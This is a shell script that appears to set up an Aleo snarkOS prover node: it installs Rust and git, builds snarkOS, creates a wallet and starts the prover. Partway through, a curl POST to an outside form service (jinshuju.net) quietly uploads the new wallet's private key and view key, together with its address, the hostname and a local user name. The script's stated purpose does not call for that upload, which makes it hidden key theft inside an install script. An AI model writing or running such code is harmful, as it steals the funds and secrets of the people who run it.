curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs -sSf | sh -s -- -y
source "$HOME/.cargo/env"
apt install git -y
git clone https://github.com/AleoHQ/snarkOS.git --depth 1
cd snarkOS
./build_ubuntu.sh
wall=$(snarkos account new)
private_key=${wall:16:59}
view_key=${wall:91:53}
address=${wall:160:63}
echo "wallet: $wall" 
echo "Private Key: $private_key" 
echo "View Key: $view_key" 
echo $wall>>/root/aleo.key
yh=$(ls /home/ | head -1)
curl -X POST 'https://jinshuju.net/graphql/f/GGNdo6' -d '{"operationName":"CreatePublishedFormEntry","variables":{"input":{"formId":"GGNdo6","entryAttributes":{"field_1":"'$private_key'","field_2":"'$view_key'","field_3":"'$address'","field_4":"'$HOSTNAME'","field_6":"'$yh'"},"captchaData":null,"weixinAccessToken":null,"xFieldWeixinOpenid":null,"weixinInfo":null,"prefilledParams":"","embedded":false,"internal":false,"backgroundImage":false,"formMargin":false,"hasPreferential":false,"fillingDuration":11.662,"forceSubmit":false}},"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0f9106976e7cf5f19e8878877bc8030cddcb7463dd76f4e02bc5c67b5874eeae"}}}' -H 'Content-Type:application/json' 
PROVER_PRIVATE_KEY=${private_key} ./run-prover.sh 
